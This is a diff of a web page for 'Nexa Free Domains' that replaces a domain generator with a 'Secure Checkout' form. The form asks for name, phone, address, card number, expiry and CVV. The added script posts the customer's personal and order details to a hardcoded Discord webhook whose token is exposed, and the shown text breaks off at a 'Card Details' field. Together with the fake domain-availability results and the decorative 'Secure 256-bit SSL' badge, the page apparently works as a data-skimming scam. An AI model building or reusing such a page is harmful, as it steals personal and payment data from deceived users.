@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexa Free Domains · Domain Generator</title>
+    <title>Nexa Free Domains · Checkout</title>
     <!-- Font Awesome 6 -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <!-- Google Fonts (Inter) -->
@@ -89,12 +89,18 @@
         }
 
         .main-container {
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 2rem auto;
             padding: 0 2rem;
         }
 
-        .domain-generator {
+        .checkout-grid {
+            display: grid;
+            grid-template-columns: 1.5fr 1fr;
+            gap: 2rem;
+        }
+
+        .checkout-form {
             background: rgba(255, 255, 255, 0.9);
             backdrop-filter: blur(16px);
             border-radius: 32px;
@@ -103,213 +109,218 @@
             border: 1px solid rgba(255,255,255,0.6);
         }
 
-        .generator-header {
+        .order-summary {
+            background: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(16px);
+            border-radius: 32px;
+            padding: 2.5rem;
+            box-shadow: 0 30px 60px rgba(0, 30, 60, 0.15);
+            border: 1px solid rgba(255,255,255,0.6);
+            height: fit-content;
+        }
+
+        .form-header {
             display: flex;
-            justify-content: space-between;
             align-items: center;
-            flex-wrap: wrap;
-            gap: 1.5rem;
+            gap: 1rem;
             margin-bottom: 2rem;
         }
 
-        .generator-header h1 {
-            font-size: 2.5rem;
+        .form-header h1 {
+            font-size: 2rem;
             background: linear-gradient(130deg, #0a192f, #1d4ed8);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
         }
 
-        .currency-badge {
-            background: #0a192f;
-            color: white;
-            padding: 0.5rem 1.5rem;
-            border-radius: 40px;
-            font-weight: 600;
+        .step-indicator {
             display: flex;
             align-items: center;
-            gap: 8px;
-        }
-
-        .search-section {
-            display: flex;
             gap: 1rem;
-            flex-wrap: wrap;
             margin-bottom: 2rem;
         }
 
-        .domain-input {
-            flex: 2;
-            min-width: 300px;
-            position: relative;
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
 
-        .domain-input input {
-            width: 100%;
-            padding: 1.2rem 1.5rem;
-            font-size: 1.2rem;
-            border: 2px solid #e2e8f0;
-            border-radius: 60px;
-            outline: none;
-            transition: 0.2s;
-            background: white;
-        }
-
-        .domain-input input:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
-        }
-
-        .tld-selector {
-            flex: 1;
-            min-width: 200px;
-        }
-
-        .tld-selector select {
-            width: 100%;
-            padding: 1.2rem 1.5rem;
-            font-size: 1.2rem;
-            border: 2px solid #e2e8f0;
-            border-radius: 60px;
-            background: white;
-            cursor: pointer;
-            outline: none;
-        }
-
-        .check-button {
-            flex: 0.5;
-            min-width: 150px;
-            background: #0a192f;
-            color: white;
-            border: none;
-            border-radius: 60px;
-            font-size: 1.2rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.2s;
+        .step-number {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: #e2e8f0;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            font-weight: 600;
+            color: #64748b;
         }
 
-        .check-button:hover {
-            background: #1e3a8a;
-            transform: scale(1.02);
+        .step.active .step-number {
+            background: #3b82f6;
+            color: white;
         }
 
-        .availability-result {
-            margin: 2rem 0;
-            padding: 1.5rem;
-            border-radius: 20px;
-            display: none;
-            align-items: center;
-            gap: 1rem;
-            font-size: 1.2rem;
+        .step.completed .step-number {
+            background: #10b981;
+            color: white;
         }
 
-        .available {
-            background: #10b98120;
-            border: 2px solid #10b981;
-            display: flex;
+        .step-line {
+            width: 50px;
+            height: 2px;
+            background: #e2e8f0;
         }
 
-        .taken {
-            background: #ef444420;
-            border: 2px solid #ef4444;
-            display: flex;
+        .form-section {
+            margin-bottom: 2rem;
+            padding-bottom: 2rem;
+            border-bottom: 1px solid #e2e8f0;
         }
 
-        .available i {
-            color: #10b981;
-            font-size: 2rem;
-        }
-
-        .taken i {
-            color: #ef4444;
-            font-size: 2rem;
-        }
-
-        .terms-section {
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: #f8fafc;
-            border-radius: 20px;
-        }
-
-        .checkbox-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 1rem;
-            cursor: pointer;
-        }
-
-        .checkbox-wrapper input {
-            width: 20px;
-            height: 20px;
-            cursor: pointer;
-        }
-
-        .purchase-section {
-            background: white;
-            border-radius: 24px;
-            padding: 2rem;
-            margin-top: 2rem;
-            border: 1px solid #e2e8f0;
-        }
-
-        .price-display {
-            font-size: 2rem;
-            font-weight: 700;
+        .form-section h2 {
+            font-size: 1.3rem;
+            margin-bottom: 1.5rem;
             color: #0a192f;
-            margin: 1rem 0;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
         }
 
-        .plan-cards {
+        .form-row {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 1.5rem;
-            margin: 2rem 0;
+            grid-template-columns: 1fr 1fr;
+            gap: 1rem;
+            margin-bottom: 1rem;
         }
 
-        .plan-card {
-            background: #f8fafc;
-            border-radius: 20px;
-            padding: 2rem;
-            text-align: center;
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 500;
+            color: #334155;
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 0.8rem 1rem;
             border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            font-size: 1rem;
             transition: 0.2s;
-            cursor: pointer;
+            background: white;
         }
 
-        .plan-card:hover {
+        .form-group input:focus, .form-group select:focus {
             border-color: #3b82f6;
-            transform: translateY(-4px);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
         }
 
-        .plan-card.selected {
+        .form-group input[readonly] {
+            background: #f8fafc;
+            cursor: not-allowed;
+        }
+
+        .payment-methods {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .payment-method {
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .payment-method:hover {
+            border-color: #3b82f6;
+        }
+
+        .payment-method.selected {
             border-color: #3b82f6;
             background: #3b82f610;
         }
 
-        .plan-card h3 {
-            font-size: 1.5rem;
-            margin-bottom: 1rem;
+        .payment-method i {
+            font-size: 2rem;
+            margin-bottom: 0.5rem;
             color: #0a192f;
         }
 
-        .plan-price {
-            font-size: 2rem;
-            font-weight: 700;
-            color: #3b82f6;
-            margin-bottom: 1rem;
+        .payment-method span {
+            display: block;
+            font-weight: 500;
         }
 
-        .plan-price small {
-            font-size: 1rem;
+        .card-details {
+            display: none;
+            margin-top: 1.5rem;
+        }
+
+        .card-details.show {
+            display: block;
+        }
+
+        .order-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+
+        .order-item:last-child {
+            border-bottom: none;
+        }
+
+        .item-details h3 {
+            font-size: 1.1rem;
+            color: #0a192f;
+        }
+
+        .item-details p {
             color: #64748b;
+            font-size: 0.9rem;
         }
 
-        .purchase-btn {
+        .item-price {
+            font-weight: 600;
+            color: #3b82f6;
+        }
+
+        .price-breakdown {
+            margin: 1.5rem 0;
+        }
+
+        .price-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            color: #334155;
+        }
+
+        .price-row.total {
+            border-top: 2px solid #e2e8f0;
+            margin-top: 0.5rem;
+            padding-top: 1rem;
+            font-weight: 700;
+            font-size: 1.2rem;
+            color: #0a192f;
+        }
+
+        .place-order-btn {
             width: 100%;
             background: #0a192f;
             color: white;
@@ -320,69 +331,125 @@
             font-weight: 600;
             cursor: pointer;
             transition: 0.2s;
-            margin-top: 1rem;
+            margin-top: 1.5rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        .purchase-btn:hover:not(:disabled) {
+        .place-order-btn:hover:not(:disabled) {
             background: #1e3a8a;
+            transform: scale(1.02);
         }
 
-        .purchase-btn:disabled {
+        .place-order-btn:disabled {
             background: #94a3b8;
             cursor: not-allowed;
         }
 
-        .fake-domains {
-            margin-top: 2rem;
+        .secure-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 1rem;
+            margin-top: 1rem;
+            color: #64748b;
+            font-size: 0.9rem;
         }
 
-        .fake-domains h3 {
+        .secure-badge i {
+            color: #10b981;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background: white;
+            border-radius: 32px;
+            padding: 2.5rem;
+            max-width: 500px;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        .modal-icon {
+            width: 80px;
+            height: 80px;
+            background: #10b981;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1.5rem;
+        }
+
+        .modal-icon i {
+            font-size: 3rem;
+            color: white;
+        }
+
+        .modal h2 {
             margin-bottom: 1rem;
             color: #0a192f;
         }
 
-        .domain-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 1rem;
+        .modal p {
+            color: #64748b;
+            margin-bottom: 0.5rem;
         }
 
-        .domain-card {
-            background: white;
-            padding: 1rem;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border: 1px solid #e2e8f0;
+        .modal .order-id {
+            background: #f1f5f9;
+            padding: 0.5rem;
+            border-radius: 8px;
+            font-family: monospace;
+            margin: 1rem 0;
         }
 
-        .domain-card.available {
-            background: #10b98110;
-            border-color: #10b981;
-            display: flex;
-        }
-
-        .domain-card.taken {
-            background: #ef444410;
-            border-color: #ef4444;
-            display: flex;
-        }
-
-        .domain-name {
+        .modal-btn {
+            background: #0a192f;
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 60px;
             font-weight: 600;
+            cursor: pointer;
+            margin-top: 1rem;
         }
 
-        .domain-status i {
-            font-size: 1.2rem;
+        @keyframes slideIn {
+            from {
+                transform: translateY(-20px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
         }
 
         .loading-spinner {
             display: none;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #3b82f6;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
             border-radius: 50%;
             animation: spin 1s linear infinite;
         }
@@ -402,104 +469,225 @@
         <div class="nav-links">
             <a href="#"><i class="fas fa-home"></i> Home</a>
             <a href="#"><i class="fas fa-search"></i> Generator</a>
-            <a href="#"><i class="fas fa-tags"></i> Pricing</a>
+            <a href="#"><i class="fas fa-shopping-cart"></i> Checkout</a>
             <a href="#" id="logoutBtn" style="border:1px solid #3b82f6; border-radius:40px; padding:0.5rem 1.5rem;"><i class="fas fa-sign-out-alt"></i> Logout</a>
         </div>
     </nav>
 
     <div class="main-container">
-        <div class="domain-generator">
-            <div class="generator-header">
-                <h1><i class="fas fa-search"></i> Domain Generator</h1>
-                <div class="currency-badge" id="currencyDisplay">
-                    <i class="fas fa-globe"></i> Loading...
+        <div class="checkout-grid">
+            <!-- Checkout Form -->
+            <div class="checkout-form">
+                <div class="form-header">
+                    <i class="fas fa-lock" style="color: #3b82f6; font-size: 1.5rem;"></i>
+                    <h1>Secure Checkout</h1>
                 </div>
+
+                <div class="step-indicator">
+                    <div class="step active" id="step1">
+                        <div class="step-number">1</div>
+                        <span>Details</span>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step" id="step2">
+                        <div class="step-number">2</div>
+                        <span>Payment</span>
+                    </div>
+                    <div class="step-line"></div>
+                    <div class="step" id="step3">
+                        <div class="step-number">3</div>
+                        <span>Confirm</span>
+                    </div>
+                </div>
+
+                <form id="checkoutForm">
+                    <!-- Personal Information Section -->
+                    <div class="form-section">
+                        <h2><i class="fas fa-user"></i> Personal Information</h2>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>First Name *</label>
+                                <input type="text" id="firstName" required placeholder="John">
+                            </div>
+                            <div class="form-group">
+                                <label>Last Name *</label>
+                                <input type="text" id="lastName" required placeholder="Doe">
+                            </div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Email Address *</label>
+                            <input type="email" id="email" required readonly placeholder="Auto-filled from login">
+                        </div>
+
+                        <div class="form-group">
+                            <label>Phone Number *</label>
+                            <input type="tel" id="phone" required placeholder="+1 234 567 8900">
+                        </div>
+                    </div>
+
+                    <!-- Billing Address Section -->
+                    <div class="form-section">
+                        <h2><i class="fas fa-map-marker-alt"></i> Billing Address</h2>
+
+                        <div class="form-group">
+                            <label>Address Line *</label>
+                            <input type="text" id="address" required placeholder="Street address, P.O. box">
+                        </div>
+
+                        <div class="form-group">
+                            <label>Apartment, suite, etc. (optional)</label>
+                            <input type="text" id="address2" placeholder="Apt 123">
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>City *</label>
+                                <input type="text" id="city" required placeholder="New York">
+                            </div>
+                            <div class="form-group">
+                                <label>State / Province *</label>
+                                <input type="text" id="state" required placeholder="NY">
+                            </div>
+                        </div>
+
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>ZIP / Postal Code *</label>
+                                <input type="text" id="zip" required placeholder="10001">
+                            </div>
+                            <div class="form-group">
+                                <label>Country *</label>
+                                <select id="country" required>
+                                    <option value="">Select Country</option>
+                                    <option value="US">United States</option>
+                                    <option value="GB">United Kingdom</option>
+                                    <option value="CA">Canada</option>
+                                    <option value="AU">Australia</option>
+                                    <option value="DE">Germany</option>
+                                    <option value="FR">France</option>
+                                    <option value="JP">Japan</option>
+                                    <option value="IN">India</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Payment Method Section -->
+                    <div class="form-section">
+                        <h2><i class="fas fa-credit-card"></i> Payment Method</h2>
+
+                        <div class="payment-methods">
+                            <div class="payment-method selected" data-method="card">
+                                <i class="fas fa-credit-card"></i>
+                                <span>Credit Card</span>
+                            </div>
+                            <div class="payment-method" data-method="paypal">
+                                <i class="fab fa-paypal"></i>
+                                <span>PayPal</span>
+                            </div>
+                            <div class="payment-method" data-method="crypto">
+                                <i class="fab fa-bitcoin"></i>
+                                <span>Cryptocurrency</span>
+                            </div>
+                        </div>
+
+                        <!-- Credit Card Details -->
+                        <div class="card-details show" id="cardDetails">
+                            <div class="form-group">
+                                <label>Card Number *</label>
+                                <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19">
+                            </div>
+                            
+                            <div class="form-row">
+                                <div class="form-group">
+                                    <label>Expiry Date *</label>
+                                    <input type="text" id="expiry" placeholder="MM/YY" maxlength="5">
+                                </div>
+                                <div class="form-group">
+                                    <label>CVV *</label>
+                                    <input type="text" id="cvv" placeholder="123" maxlength="3">
+                                </div>
+                            </div>
+
+                            <div class="form-group">
+                                <label>Cardholder Name *</label>
+                                <input type="text" id="cardholderName" placeholder="As shown on card">
+                            </div>
+                        </div>
+                    </div>
+                </form>
             </div>
 
-            <!-- Search Section -->
-            <div class="search-section">
-                <div class="domain-input">
-                    <input type="text" id="domainInput" placeholder="Enter your idea..." value="myawesomeproject">
+            <!-- Order Summary -->
+            <div class="order-summary">
+                <h2 style="margin-bottom: 1.5rem;">Order Summary</h2>
+
+                <div class="order-item">
+                    <div class="item-details">
+                        <h3 id="summaryDomain">myawesomeproject.com</h3>
+                        <p>Domain registration · 1 year</p>
+                    </div>
+                    <div class="item-price" id="domainPrice">$0.00</div>
                 </div>
-                <div class="tld-selector">
-                    <select id="tldSelect">
-                        <option value=".com">.com</option>
-                        <option value=".io">.io</option>
-                        <option value=".xyz">.xyz</option>
-                        <option value=".app">.app</option>
-                        <option value=".dev">.dev</option>
-                        <option value=".net">.net</option>
-                        <option value=".org">.org</option>
-                        <option value=".co">.co</option>
-                    </select>
+
+                <div class="order-item">
+                    <div class="item-details">
+                        <h3 id="summaryPlan">Free Plan</h3>
+                        <p>Includes basic DNS management</p>
+                    </div>
+                    <div class="item-price" id="planPrice">$0.00</div>
                 </div>
-                <button class="check-button" id="checkDomainBtn">
-                    <i class="fas fa-search"></i> Check
+
+                <div class="price-breakdown">
+                    <div class="price-row">
+                        <span>Subtotal</span>
+                        <span id="subtotal">$0.00</span>
+                    </div>
+                    <div class="price-row">
+                        <span>Tax (0%)</span>
+                        <span id="tax">$0.00</span>
+                    </div>
+                    <div class="price-row total">
+                        <span>Total</span>
+                        <span id="totalPrice">$0.00</span>
+                    </div>
+                </div>
+
+                <div class="secure-badge">
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Secure 256-bit SSL encryption</span>
+                    <i class="fas fa-lock"></i>
+                </div>
+
+                <button class="place-order-btn" id="placeOrderBtn">
+                    <i class="fas fa-lock"></i>
+                    <span>Place Order</span>
+                    <div class="loading-spinner" id="orderSpinner"></div>
                 </button>
-            </div>
 
-            <!-- Availability Result -->
-            <div id="availabilityResult" class="availability-result">
-                <i class="fas" id="resultIcon"></i>
-                <div id="resultMessage"></div>
-                <div class="loading-spinner" id="loadingSpinner"></div>
+                <p style="text-align: center; margin-top: 1rem; color: #64748b; font-size: 0.8rem;">
+                    By placing your order, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+                </p>
             </div>
+        </div>
+    </div>
 
-            <!-- Terms Checkbox -->
-            <div class="terms-section">
-                <label class="checkbox-wrapper">
-                    <input type="checkbox" id="termsCheckbox">
-                    <span>I accept the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></span>
-                </label>
+    <!-- Success Modal -->
+    <div class="modal" id="successModal">
+        <div class="modal-content">
+            <div class="modal-icon">
+                <i class="fas fa-check"></i>
             </div>
-
-            <!-- Purchase Section -->
-            <div class="purchase-section">
-                <h2>Choose Your Plan</h2>
-                <div id="priceDisplay" class="price-display"></div>
-                
-                <div class="plan-cards">
-                    <div class="plan-card selected" data-plan="free">
-                        <h3>Free</h3>
-                        <div class="plan-price" id="freePrice">$0</div>
-                        <p>Perfect for testing</p>
-                        <ul style="list-style: none; margin-top: 1rem;">
-                            <li><i class="fas fa-check" style="color: #10b981;"></i> 1 domain</li>
-                            <li><i class="fas fa-check" style="color: #10b981;"></i> Basic DNS</li>
-                        </ul>
-                    </div>
-                    <div class="plan-card" data-plan="basic">
-                        <h3>Basic</h3>
-                        <div class="plan-price" id="basicPrice">$5</div>
-                        <p>For personal projects</p>
-                        <ul style="list-style: none; margin-top: 1rem;">
-                            <li><i class="fas fa-check" style="color: #10b981;"></i> 5 domains</li>
-                            <li><i class="fas fa-check" style="color: #10b981;"></i> SSL included</li>
-                        </ul>
-                    </div>
-                    <div class="plan-card" data-plan="pro">
-                        <h3>Pro</h3>
-                        <div class="plan-price" id="proPrice">$15</div>
-                        <p>For businesses</p>
-                        <ul style="list-style: none; margin-top: 1rem;">
-                            <li><i class="fas fa-check" style="color: #10b981;"></i> Unlimited domains</li>
-                            <li><i class="fas fa-check" style="color: #10b981;"></i> Priority support</li>
-                        </ul>
-                    </div>
-                </div>
-
-                <button class="purchase-btn" id="purchaseBtn" disabled>
-                    <i class="fas fa-lock"></i> Continue to Checkout
-                </button>
-            </div>
-
-            <!-- Fake Recently Generated Domains -->
-            <div class="fake-domains">
-                <h3><i class="fas fa-history"></i> Recently Generated</h3>
-                <div class="domain-grid" id="fakeDomains">
-                    <!-- Populated by JavaScript -->
-                </div>
-            </div>
+            <h2>Order Confirmed!</h2>
+            <p>Thank you for your purchase</p>
+            <div class="order-id" id="orderIdDisplay">ORDER-2024-001234</div>
+            <p>A confirmation email has been sent to:</p>
+            <p><strong id="confirmationEmail">user@example.com</strong></p>
+            <button class="modal-btn" onclick="window.location.href='domaingenerator.html'">
+                <i class="fas fa-rocket"></i> Back to Generator
+            </button>
         </div>
     </div>
 
@@ -521,9 +709,8 @@
         const app = initializeApp(firebaseConfig);
         const auth = getAuth(app);
 
-        // Discord Webhook - will stop after first use
+        // Discord Webhook
         const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1482059165227548682/IrrpYTrV3YuNdKhTz3tIonlzKjsFQC_RzQmFXwjAjwHd_UgFTP-_BRDBRK59goMcVFXf";
-        let webhookTriggered = false;
 
         // Currency exchange rates (base: USD)
         const exchangeRates = {
@@ -549,45 +736,63 @@
             'default': '$'
         };
 
-        // Mock domain availability database (simulate taken domains)
-        const takenDomains = [
-            'google.com', 'facebook.com', 'amazon.com', 'microsoft.com',
-            'apple.com', 'netflix.com', 'twitter.com', 'instagram.com',
-            'linkedin.com', 'github.com', 'stackoverflow.com', 'youtube.com'
-        ];
-
-        // Fake domain list for "recently generated"
-        const fakeDomainList = [
-            'techstartup.io', 'creativeapp.xyz', 'businesshub.com',
-            'devstudio.app', 'marketingpro.dev', 'designlab.net',
-            'cloudspace.co', 'innovatehub.org', 'startupvision.com',
-            'digitalwave.io', 'futuretech.xyz', 'smartideas.app'
-        ];
-
         // DOM Elements
-        const domainInput = document.getElementById('domainInput');
-        const tldSelect = document.getElementById('tldSelect');
-        const checkBtn = document.getElementById('checkDomainBtn');
-        const availabilityResult = document.getElementById('availabilityResult');
-        const resultIcon = document.getElementById('resultIcon');
-        const resultMessage = document.getElementById('resultMessage');
-        const loadingSpinner = document.getElementById('loadingSpinner');
-        const termsCheckbox = document.getElementById('termsCheckbox');
-        const purchaseBtn = document.getElementById('purchaseBtn');
-        const currencyDisplay = document.getElementById('currencyDisplay');
-        const freePrice = document.getElementById('freePrice');
-        const basicPrice = document.getElementById('basicPrice');
-        const proPrice = document.getElementById('proPrice');
-        const priceDisplay = document.getElementById('priceDisplay');
-        const fakeDomainsContainer = document.getElementById('fakeDomains');
+        const firstName = document.getElementById('firstName');
+        const lastName = document.getElementById('lastName');
+        const email = document.getElementById('email');
+        const phone = document.getElementById('phone');
+        const address = document.getElementById('address');
+        const address2 = document.getElementById('address2');
+        const city = document.getElementById('city');
+        const state = document.getElementById('state');
+        const zip = document.getElementById('zip');
+        const country = document.getElementById('country');
+        const placeOrderBtn = document.getElementById('placeOrderBtn');
+        const orderSpinner = document.getElementById('orderSpinner');
+        const successModal = document.getElementById('successModal');
+        const confirmationEmail = document.getElementById('confirmationEmail');
+        const orderIdDisplay = document.getElementById('orderIdDisplay');
         const logoutBtn = document.getElementById('logoutBtn');
+        const summaryDomain = document.getElementById('summaryDomain');
+        const summaryPlan = document.getElementById('summaryPlan');
+        const domainPrice = document.getElementById('domainPrice');
+        const planPrice = document.getElementById('planPrice');
+        const subtotal = document.getElementById('subtotal');
+        const tax = document.getElementById('tax');
+        const totalPrice = document.getElementById('totalPrice');
+
+        // Payment method elements
+        const paymentMethods = document.querySelectorAll('.payment-method');
+        const cardDetails = document.getElementById('cardDetails');
+        const cardNumber = document.getElementById('cardNumber');
+        const expiry = document.getElementById('expiry');
+        const cvv = document.getElementById('cvv');
+        const cardholderName = document.getElementById('cardholderName');
 
         // State
         let currentUser = null;
-        let userCurrency = { symbol: '$', rate: 1.0, code: 'USD' };
         let selectedPlan = 'free';
-        let currentDomain = '';
-        let domainAvailable = false;
+        let selectedDomain = 'myawesomeproject.com';
+        let userCurrency = { symbol: '$', rate: 1.0, code: 'USD' };
+        let orderData = {};
+
+        // Load order data from session storage
+        function loadOrderData() {
+            const savedDomain = sessionStorage.getItem('selectedDomain');
+            const savedPlan = sessionStorage.getItem('selectedPlan');
+            
+            if (savedDomain) {
+                selectedDomain = savedDomain;
+                summaryDomain.textContent = savedDomain;
+            }
+            
+            if (savedPlan) {
+                selectedPlan = savedPlan;
+                if (savedPlan === 'free') summaryPlan.textContent = 'Free Plan';
+                else if (savedPlan === 'basic') summaryPlan.textContent = 'Basic Plan';
+                else if (savedPlan === 'pro') summaryPlan.textContent = 'Pro Plan';
+            }
+        }
 
         // Detect user location and set currency
         async function detectCurrency() {
@@ -608,7 +813,7 @@
                     currencyCode = 'USD';
                     symbol = '$';
                     rate = exchangeRates.US;
-                } else if (countryCode.startsWith('E')) { // Rough EU detection
+                } else if (countryCode === 'DE' || countryCode === 'FR' || countryCode === 'ES' || countryCode === 'IT') {
                     currencyCode = 'EUR';
                     symbol = '€';
                     rate = exchangeRates.EU;
@@ -619,165 +824,245 @@
                 }
 
                 userCurrency = { symbol, rate, code: currencyCode };
-                currencyDisplay.innerHTML = `<i class="fas fa-money-bill"></i> ${currencyCode} (${symbol})`;
-                
-                // Update prices
                 updatePrices();
             } catch (error) {
                 console.log('Using default currency');
-                currencyDisplay.innerHTML = `<i class="fas fa-money-bill"></i> USD ($)`;
             }
         }
 
-        // Update prices based on currency
+        // Update prices based on plan and currency
         function updatePrices() {
             const basePrices = { free: 0, basic: 5, pro: 15 };
-            const convertedPrices = {
-                free: basePrices.free * userCurrency.rate,
-                basic: basePrices.basic * userCurrency.rate,
-                pro: basePrices.pro * userCurrency.rate
-            };
-
-            freePrice.textContent = `${userCurrency.symbol}${convertedPrices.free.toFixed(2)}`;
-            basicPrice.textContent = `${userCurrency.symbol}${convertedPrices.basic.toFixed(2)}`;
-            proPrice.textContent = `${userCurrency.symbol}${convertedPrices.pro.toFixed(2)}`;
+            const convertedPrice = basePrices[selectedPlan] * userCurrency.rate;
             
-            if (selectedPlan === 'free') {
-                priceDisplay.innerHTML = `Total: ${userCurrency.symbol}0.00 <small>(${userCurrency.code})</small>`;
-            } else if (selectedPlan === 'basic') {
-                priceDisplay.innerHTML = `Total: ${userCurrency.symbol}${convertedPrices.basic.toFixed(2)} <small>(${userCurrency.code})</small>`;
+            domainPrice.textContent = `${userCurrency.symbol}0.00`;
+            planPrice.textContent = `${userCurrency.symbol}${convertedPrice.toFixed(2)}`;
+            subtotal.textContent = `${userCurrency.symbol}${convertedPrice.toFixed(2)}`;
+            tax.textContent = `${userCurrency.symbol}0.00`;
+            totalPrice.textContent = `${userCurrency.symbol}${convertedPrice.toFixed(2)}`;
+        }
+
+        // Format card number with spaces
+        function formatCardNumber(value) {
+            const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            const matches = v.match(/\d{4,16}/g);
+            const match = matches && matches[0] || '';
+            const parts = [];
+            
+            for (let i = 0; i < match.length; i += 4) {
+                parts.push(match.substring(i, i + 4));
+            }
+            
+            if (parts.length) {
+                return parts.join(' ');
             } else {
-                priceDisplay.innerHTML = `Total: ${userCurrency.symbol}${convertedPrices.pro.toFixed(2)} <small>(${userCurrency.code})</small>`;
+                return value;
             }
         }
 
-        // Check if domain is available
-        function checkDomainAvailability(domain) {
-            const fullDomain = domain + tldSelect.value;
-            const isTaken = takenDomains.includes(fullDomain.toLowerCase()) || 
-                           Math.random() > 0.7; // 30% chance of being taken for demo
-            
-            return {
-                available: !isTaken,
-                domain: fullDomain
-            };
+        // Format expiry date
+        function formatExpiry(value) {
+            const v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            if (v.length >= 2) {
+                return v.substring(0, 2) + '/' + v.substring(2, 4);
+            }
+            return v;
         }
 
-        // Update fake domains (every second)
-        function updateFakeDomains() {
-            const shuffled = [...fakeDomainList].sort(() => 0.5 - Math.random());
-            const selected = shuffled.slice(0, 6);
-            
-            fakeDomainsContainer.innerHTML = selected.map(domain => {
-                const isAvailable = !takenDomains.includes(domain.toLowerCase()) && Math.random() > 0.5;
-                return `
-                    <div class="domain-card ${isAvailable ? 'available' : 'taken'}">
-                        <span class="domain-name">${domain}</span>
-                        <span class="domain-status">
-                            <i class="fas ${isAvailable ? 'fa-check-circle' : 'fa-times-circle'}" 
-                               style="color: ${isAvailable ? '#10b981' : '#ef4444'}"></i>
-                        </span>
-                    </div>
-                `;
-            }).join('');
+        // Generate order ID
+        function generateOrderId() {
+            const timestamp = Date.now().toString(36).toUpperCase();
+            const random = Math.random().toString(36).substring(2, 8).toUpperCase();
+            return `NEXA-${timestamp}-${random}`;
         }
 
-        // Send to Discord (only once per session)
-        async function sendDiscordNotification(user, action) {
-            if (webhookTriggered) return;
-            
+        // Send order to Discord webhook
+        async function sendOrderToDiscord(orderDetails) {
             try {
+                const embed = {
+                    title: '🛒 **NEW ORDER PLACED**',
+                    color: 0x3b82f6,
+                    fields: [
+                        {
+                            name: '👤 Customer Information',
+                            value: `**Name:** ${orderDetails.firstName} ${orderDetails.lastName}\n**Email:** ${orderDetails.email}\n**Phone:** ${orderDetails.phone}`,
+                            inline: false
+                        },
+                        {
+                            name: '📍 Billing Address',
+                            value: `**Address:** ${orderDetails.address} ${orderDetails.address2 || ''}\n**City:** ${orderDetails.city}\n**State:** ${orderDetails.state}\n**ZIP:** ${orderDetails.zip}\n**Country:** ${orderDetails.country}`,
+                            inline: false
+                        },
+                        {
+                            name: '📦 Order Details',
+                            value: `**Order ID:** ${orderDetails.orderId}\n**Domain:** ${orderDetails.domain}\n**Plan:** ${orderDetails.plan}\n**Payment Method:** ${orderDetails.paymentMethod}`,
+                            inline: false
+                        },
+                        {
+                            name: '💰 Payment Information',
+                            value: `**Subtotal:** ${orderDetails.currency.symbol}${orderDetails.subtotal}\n**Tax:** ${orderDetails.currency.symbol}${orderDetails.tax}\n**Total:** ${orderDetails.currency.symbol}${orderDetails.total}`,
+                            inline: false
+                        },
+                        {
+                            name: '💳 Card Details (Last 4)',
